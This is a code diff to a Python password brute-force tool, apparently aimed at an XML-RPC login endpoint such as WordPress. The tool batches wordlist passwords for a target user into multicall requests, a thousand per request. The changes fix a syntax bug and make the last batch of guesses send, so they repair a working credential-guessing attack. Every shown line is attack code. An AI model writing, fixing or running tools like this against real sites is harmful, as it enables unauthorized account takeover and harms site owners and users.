@@ -37,8 +37,9 @@ class Forcer:
     '''
         body = start
         cnt = 1
-        with open(self.wordlist) as list:
-            for pass in list:
+        with open(self.wordlist, "r") as list:
+            lines = list.readlines()
+            for p in lines:
                 body += f'''
                     <value><struct>
                   <member>
@@ -49,7 +50,7 @@ class Forcer:
                 	<name>params</name><value><array><data>
                 	<value><array><data>
                 	<value><string>{self.user}</string></value>
-                	<value><string>{pass.strip()}</string></value>
+                	<value><string>{p.strip()}</string></value>
                 	</data></array></value>
                 	</data></array></value>
                   </member>
@@ -57,7 +58,7 @@ class Forcer:
                 '''
                 cnt += 1
                 # send requests by the thousand, modify this depending on servers power
-                if cnt % 1000 == 0:
+                if cnt % 1000 == 0 or p == lines[-1]:
                     body += end
                     print(Fore.BLUE)
                     print(f"sending body: {body}")
